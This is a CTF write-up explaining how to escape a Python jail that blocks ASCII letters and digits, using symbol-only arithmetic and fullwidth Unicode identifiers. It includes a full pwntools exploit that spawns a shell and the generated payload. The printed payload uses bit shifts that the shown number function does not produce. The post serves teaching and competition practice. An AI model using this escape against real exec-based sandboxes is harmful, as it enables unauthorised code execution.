---
setup: |
  import Layout from '../../layouts/BlogPost.astro'
  import PictureThemed from '../../components/PictureThemed.astro'
title: pyjail escape without ascii characters and numbers - bluehens writeup
publishDate: 2023-11-1
description: writeup for bluehens 2023
tags: ['writeup', 'python', 'pyjail']
permalink: https://halb.it/posts/bluehens-pyjail/
---

### the challenge

The challenge code consisted in a very short python script, running behind netcat

```python
blacklist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

security_check = lambda s: any(c in blacklist for c in s) or s.count('_') > 50

while True: 
    cmds = input("> ")
    if security_check(cmds):
        print("nope.")
    else:
        exec(cmds, {'__builtins__': None}, {})
    
```

For the uninitialized, this is a very common pyjail setup:

- The `security_check` function makes sure the user input does not contain any ascii letter or number

- if the input is valid, it is executed in an environment without any builtin

- By looking at the challenge Dockerfile, it's clear that our goal is to read the `/flag` file and print it

### python without letters or numbers

The Javascript language can be written using only combinations of the symbols `[]()!+` in a dialect known as [jsfuck](https://jsfuck.com).
Unfortunately python does not reach these levels of greatness, but it can get close thanks to some quirks of it's implicit type conversion system:

- `False` => `[] > []`
- `True`  => `[[]] > []`
- `0` => `-([] > [])`
- `-1` => `~([] > [])`
- `1` => `-~([] > [])`
- `2` => `1+1` =>  `(-~[]<[])+(-~([]<[])) `

With some creativity, it's easy to create any number. There is the possibility for a lot of fancy optimizations if you are allowed to use `*, <<, >>` or other operators. The current challenge however does not have a payload size constraint, so we'll fight the urge to find an optimal solution, and keep everything as simple as possible

```python
def craft_num(n):
    """
    craft symbol-only numbers, in an inefficient way
    """
    str_0 = "-([]<[])"
    str_1 = "(-~([]<[]))"
    if n == 0:
        return str_0
    ret = f"{str_1}+" * n
    return ret[:-1]
```

Unfortunately this is where we meet a wall, because python3 does not offer any way to create strings or execute statements with symbols only.
That was only possible in the age of python2 thanks to the 
backtick
(&#96;)
operator, now removed from the standard, that acted as an alias for the `repr()` function.

### filter bypass using utf-8 identifiers

If python3 broke the dream of a symbols-only python dialect, it also brought 
UTF-8 identifiers to the standard.
In our case, that feature is good enough to bypass the no-ASCII filter.<br/>
According to [the reference](https://docs.python.org/3/reference/lexical_analysis.html#identifiers):

> Python 3.0 introduces additional characters from outside the ASCII rannge. [...]
All identifiers are converted into the normal form NFKC while parsing; comparison of identifiers is based on NFKC.

what does that mean?
The Unicode standard supports the concept of [equivalence](https://www.wikiwand.com/en/Unicode_equivalence#/Normal_forms).
If we look at this useful page for the [codepoint for the letter a](https://www.compart.com/en/unicode/U+0061) for example,
we can see a long list of symbols that are declaratively similar in appearance or meaning to the ASCII letter 'a'.<br/> Here are some examples:

- U+1D4B6 𝒶 Mathematical Script Small A
- U+1D4EA 𝓪 Mathematical Bold Script Small A
- U+1D552 𝕒 Mathematical Double-Struck Small A
- U+1D586 𝖆 Mathematical Bold Fraktur Small A

All these fancy codepoints will be converted into the correct ASCII letter when [normalized](https://unicode.org/reports/tr15/#Norm_Forms), which is an operation that python3 performs before parsing an identifier.

And that's it! A lot of words just to say that we can bypass the filter by converting all the ASCII letters in our exploit into italics!<br/>
The following function automates the operation by converting every ASCII letter into the equivalent
[ｆｕｌｌｗｉｄｔｈ ｌｅｔｔｅｒｓ](https://www.compart.com/en/unicode/U+FF41)

```python
def denormalize(str):
    ret = ""
    for c in str:
        if c >= "a" and c <= "z":
            # https://www.compart.com/en/unicode/U+FF41
            # weird fullwidth a
            # the first of a sequence of codepoints compatible with ASCII letters
            weird_a = 0xff41
            offset = ord(c) - ord("a")
            ret += chr(weird_a + offset)
        else:
            ret += c

    # replace all underscores that are not at the beginning of an identifier with
    # https://www.compart.com/en/unicode/U+FF3F
    # fullwidth underscore
    ret = re.sub(r"(?<![\.\[\( ])_", chr(0xff3f), ret)

    return ret
```

### escaping the pyjail

Now that we have the ability to fully bypass the filter, we can write a classic pyjail escape payload and send it. This is the end result:

```python
from pwn import *
import re


def craft_num(n):
    """
    craft symbol-only numbers, in an inefficient way
    """
    str_0 = "-([]<[])"
    str_1 = "(-~([]<[]))"
    if n == 0:
        return str_0
    ret = f"{str_1}+" * n
    return ret[:-1]


def denormalize(str):
    ret = ""
    for c in str:
        if c >= "a" and c <= "z":
            # https://www.compart.com/en/unicode/U+FF41
            # weird fullwidth a
            # the first of a sequence of codepoints compatible with ASCII letters
            weird_a = 0xff41
            offset = ord(c) - ord("a")
            ret += chr(weird_a + offset)
        else:
            ret += c
    # replace all underscores that are not at the beginning of an identifier with
    # https://www.compart.com/en/unicode/U+FF3F
    # fullwidth underscore
    ret = re.sub(r"(?<![\.\[\( ])_", chr(0xff3f), ret)
    return ret


def craft_os_str():
    """
    payload for generating the string "_os"
    """
    underscore_str = f"().__init__.__name__[{craft_num(0)}]"
    s_str = f"[].__doc__[{craft_num(17)}]"
    br = "{}"
    o_str = f"{br}.__class__.__base__.__doc__[{craft_num(15)}]"
    os_str = f"({underscore_str})+({o_str})+({s_str})"
    return os_str


def craft_bash_str():
    """
    payload for generating the string "$0"
    which in the challenge environment is equivalent to
    the command "/bin/sh"
    """
    num_0_str = f"({craft_num(0)}).__doc__[{craft_num(33)}]"
    bash_str = f"'$'+({num_0_str})"
    return bash_str


expl_find_FileLoader = f"().__class__.__base__.__subclasses__()[{craft_num(118)}]"
expl_find_os_module  = f"{expl_find_FileLoader}.__init__.__globals__[{craft_os_str()}]"
expl_shell           = f"{expl_find_os_module}.system({craft_bash_str()})"

expl = expl_shell
expl = denormalize(expl)

print(expl)

conn = remote("localhost", 1337)
conn.sendlineafter(">", expl.encode())
conn.interactive()

```

when we execute the script, it will generate this huge payload:

```
()._＿ｃｌａｓｓ＿＿._＿ｂａｓｅ＿＿._＿ｓｕｂｃｌａｓｓｅｓ＿＿()[((-~([]<[]))<<((-~([]<[]))<<-([]<[])))+((-~([]<[]))<<((-~([]<[]))<<((-~([]<[]))<<-([]<[]))))+((-~([]<[]))<<((-~([]<[]))<<((-~([]<[]))<<((-~([]<[]))<<-([]<[])))))+((-~([]<[]))<<((-~([]<[]))<<-([]<[]))+((-~([]<[]))<<((-~([]<[]))<<((-~([]<[]))<<-([]<[])))))+((-~([]<[]))<<((-~([]<[]))<<((-~([]<[]))<<-([]<[])))+((-~([]<[]))<<((-~([]<[]))<<((-~([]<[]))<<-([]<[])))))]._＿ｉｎｉｔ＿＿._＿ｇｌｏｂａｌｓ＿＿[(()._＿ｉｎｉｔ＿＿._＿ｎａｍｅ＿＿[-([]<[])])+({}._＿ｃｌａｓｓ＿＿._＿ｂａｓｅ＿＿._＿ｄｏｃ＿＿[((-~([]<[]))<<-([]<[]))+((-~([]<[]))<<((-~([]<[]))<<-([]<[])))+((-~([]<[]))<<((-~([]<[]))<<((-~([]<[]))<<-([]<[]))))+((-~([]<[]))<<((-~([]<[]))<<-([]<[]))+((-~([]<[]))<<((-~([]<[]))<<-([]<[]))))])+([]._＿ｄｏｃ＿＿[((-~([]<[]))<<-([]<[]))+((-~([]<[]))<<((-~([]<[]))<<((-~([]<[]))<<((-~([]<[]))<<-([]<[])))))])].ｓｙｓｔｅｍ('$'+((-([]<[]))._＿ｄｏｃ＿＿[((-~([]<[]))<<-([]<[]))+((-~([]<[]))<<((-~([]<[]))<<-([]<[]))+((-~([]<[]))<<((-~([]<[]))<<((-~([]<[]))<<-([]<[])))))]))

```

Then pwntools will automatically send the payload and open an interactive shell, from which we can just `cat /flag`

### the rest of the owl

If you are confused by all those underscores,
I suggest you to look up the basics of classic pyjail escapes.
[Others](https://blog.pepsipu.com/posts/albatross-redpwnctf), far better than me, have explained that magic

